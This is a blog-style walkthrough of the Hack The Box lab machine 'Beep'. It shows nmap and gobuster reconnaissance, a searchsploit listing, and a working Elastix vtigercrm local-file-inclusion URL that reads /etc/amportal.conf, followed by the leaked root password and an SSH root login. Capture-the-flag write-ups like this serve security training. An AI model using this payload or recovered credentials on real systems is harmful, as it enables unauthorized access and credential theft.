@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Beep - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Beep"><a href="#Hack-The-Box-Beep" class="headerlink" title="Hack The Box - Beep"></a>Hack The Box - Beep</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2>
+  <p>Beep is a machine with several active services, which can make  it a bit challenging  to find the correct entry method. Its IP address is <code>10.10.10.7.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/beep/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services, with the option <code>-sC</code>for show us information about vulnerabilities:
+
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox)<br> |<br> |-->{SFire129}#nmap -A -v 10.10.10.7
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 17:01 EDT
+ NSE: Loaded 151 scripts for scanning.
+ NSE: Script Pre-scanning.
+ Nmap scan report for 10.10.10.7
+ Host is up (0.17s latency).
+ Not shown: 988 closed ports
+ PORT      STATE SERVICE    VERSION
+ 22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+ | ssh-hostkey:
+ |   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+ |_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+ 25/tcp    open  smtp       Postfix smtpd
+ |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+ 80/tcp    open  http       Apache httpd 2.2.3
+ | http-methods:
+ |_  Supported Methods: GET HEAD POST OPTIONS
+ |_http-server-header: Apache/2.2.3 (CentOS)
+ |_http-title: Did not follow redirect to https://10.10.10.7/
+ |_https-redirect: ERROR: Script execution failed (use -d to debug)
+ 110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+ |_pop3-capabilities: LOGIN-DELAY(0) PIPELINING EXPIRE(NEVER) TOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE STLS USER APOP RESP-CODES
+ 111/tcp   open  rpcbind    2 (RPC #100000)
+ 143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+ |_imap-capabilities: NO QUOTA STARTTLS Completed RIGHTS=kxte OK THREAD=REFERENCES MAILBOX-REFERRALS LIST-SUBSCRIBED SORT=MODSEQ CONDSTORE LISTEXT IMAP4 BINARY LITERAL+ ACL IMAP4rev1 MULTIAPPEND ANNOTATEMORE URLAUTHA0001 THREAD=ORDEREDSUBJECT SORT IDLE CATENATE UNSELECT ATOMIC UIDPLUS RENAME CHILDREN NAMESPACE X-NETSCAPE ID443/tcp   open  ssl/https?
+ |_ssl-date: 2020-05-10T21:07:41+00:00; +2m15s from scanner time.
+ 993/tcp   open  ssl/imap   Cyrus imapd
+ |_imap-capabilities: CAPABILITY
+ 995/tcp   open  pop3       Cyrus pop3d
+ 3306/tcp  open  mysql      MySQL (unauthorized)
+ 4445/tcp  open  upnotifyp?
+ 10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+ |_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
+ | http-methods:
+ |_  Supported Methods: GET HEAD POST OPTIONS
+ |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+ TCP/IP fingerprint:
+ OS:SCAN(V=7.80%E=4%D=5/10%OT=22%CT=1%CU=33963%PV=Y%DS=2%DC=T%G=Y%TM=5EB86D3
+ OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=C4%GCD=1%ISR=CE%TI=Z%CI=Z%II=I%TS=A)OPS(O
+ OS:1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11N
+ OS:W7%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
+ OS:=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
+ OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0%
+ OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
+ OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
+ OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
+ OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+ Uptime guess: 0.449 days (since Sun May 10 06:20:54 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=196 (Good luck!)
+ IP ID Sequence Generation: All zeros
+ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com 
+
+ Host script results: 
+ |_clock-skew: 2m14s
+
+ TRACEROUTE (using port 23/tcp)
+ HOP RTT       ADDRESS
+ 1   174.40 ms 10.10.14.1
+ 2   174.74 ms 10.10.10.7 
+
+ NSE: Script Post-scanning.
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 374.11 seconds
+           Raw packets sent: 1378 (64.418KB) | Rcvd: 1112 (48.110KB)
+<br></figure></pre>
+
+<p> Will scan some ports for search vulnerabilities.
+<br>
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)<br> |<br> |-->{SFire129}#nmap -sC -sV -p22,80,110,10000,3306,111,25 --script=*-vuln-* 10.10.10.7
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 17:09 EDT
+ Nmap scan report for 10.10.10.7
+ Host is up (0.17s latency).
+
+ PORT      STATE SERVICE VERSION
+ 22/tcp    open  ssh     OpenSSH 4.3 (protocol 2.0)
+ 25/tcp    open  smtp    Postfix smtpd
+ | smtp-vuln-cve2010-4344:
+ |_  The SMTP server is not Exim: NOT VULNERABLE
+ 80/tcp    open  http    Apache httpd 2.2.3
+ |_http-server-header: Apache/2.2.3 (CentOS)
+ |_https-redirect: ERROR: Script execution failed (use -d to debug)
+ 110/tcp   open  pop3    Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+ 111/tcp   open  rpcbind 2 (RPC #100000)
+ 3306/tcp  open  mysql   MySQL (unauthorized)
+ |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+ 10000/tcp open  http    MiniServ 1.570 (Webmin httpd)
+ | http-vuln-cve2006-3392:
+ |   VULNERABLE:
+ |   Webmin File Disclosure
+ |     State: VULNERABLE (Exploitable)
+ |     IDs:  CVE:CVE-2006-3392
+ |       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
+ |       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
+ |       to bypass the removal of "../" directory traversal sequences.
+ |
+ |     Disclosure date: 2006-06-29
+ |     References:
+ |       http://www.exploit-db.com/exploits/1997/
+ |       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
+
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 45.86 seconds</figure></pre><br>
+ <p>With the <code>gobuster</code> could be to know the directories.
+
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(/home/kali)<br> |<br> |-->{SFire129}#gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k
+ ===============================================================
+ Gobuster v3.0.1
+ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+ ===============================================================
+ [+] Url:            https://10.10.10.7/
+ [+] Threads:        50
+ [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ [+] Status codes:   200,204,301,302,307,401,403
+ [+] User Agent:     gobuster/3.0.1
+ [+] Timeout:        10s
+ ===============================================================
+ 2020/05/10 17:29:29 Starting gobuster
+ ===============================================================
+ /images (Status: 301)
+ /help (Status: 301)
+ /themes (Status: 301)
+ /modules (Status: 301)
+ /mail (Status: 301)
+ /admin (Status: 301)
+ /static (Status: 301)
+ /lang (Status: 301)
+ /var (Status: 301)
+ /panel (Status: 301)
+ /libs (Status: 301)
+ /recordings (Status: 301)
+ /configs (Status: 301)
+ /vtigercrm (Status: 301)
+ ===============================================================
+ 2020/05/10 18:25:31 Finished
+ ===============================================================</figure></pre>
+ <br>
+ <img src="/images/hackthebox/exploit/beep/1.png" alt="">
+ <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>
+<br>
+<p>With <code> searchsploit</code> we can to know about the known vulnerabilities for elastix.
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)<br> |<br> |-->{SFire129}#searchsploit elastix -w
+--------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+ Exploit Title                                                                                                                                     |  URL
+--------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+Elastix - 'page' Cross-Site Scripting                                                                                                              | https://www.exploit-db.com/exploits/38078
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                            | https://www.exploit-db.com/exploits/38544
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                      | https://www.exploit-db.com/exploits/34942
+Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                   | https://www.exploit-db.com/exploits/37637
+Elastix 2.x - Blind SQL Injection                                                                                                                  | https://www.exploit-db.com/exploits/36305
+Elastix < 2.5 - PHP Code Injection                                                                                                                 | https://www.exploit-db.com/exploits/38091
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                             | https://www.exploit-db.com/exploits/18650
+--------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+Shellcodes: No Result</figure></pre>
+<br>
+
+<p> We need to download the <code>Local File Inclusion</code> in a local file with name 37637.pl.<br>
+<p> Inside the file 37637.pl there is a line like this <br>
+<code>#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action</code> <br>
+This line means that I could to exploit a local file inclusion in the remote host.<br>
+<br>
+ 1.) Put in the browser<br> <code>https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action</code>
+<br>
+
+ <img src="/images/hackthebox/exploit/beep/2.png" alt="">
+ <br>
+ 2.) Inspect the webpage as source-code.
+
+ <img src="/images/hackthebox/exploit/beep/3.png" alt=""><br>
+ 
+ We have some passwords for root user <code>jEhdIekWmdjE</code> we can try ssh connection with this user and password to get the flag.
+
+ 
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="headerlink" title="Capture The Flag"></a> Capture The Flag</h2>
+ 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/.ssh)
+ |
+ |-->{SFire129}#ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
+ The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
+ RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+ Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
+ root@10.10.10.7's password:
+ Last login: Tue Jul 16 11:45:47 2019
+ 
+ Welcome to Elastix
+ ----------------------------------------------------
+ 
+ To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+ Open the Internet Browser using the following URL:
+ http://10.10.10.7
+ 
+ [root@beep ~]# cd /home/
+ [root@beep home]# ls
+ fanis  spamfilter
+ [root@beep home]# find /home -iname *.txt
+ /home/fanis/user.txt
+ [root@beep home]# cd fanis
+ [root@beep fanis]# ls
+ user.txt
+ [root@beep fanis]# cat user.txt
+ ***here will be show you the flag user***
+ [root@beep fanis]# cd /root
+ [root@beep ~]# ls
+ anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
+ [root@beep ~]# cat root.txt
+ ***here will be show you the flag root***</figure></pre>
+ <br>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-12</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
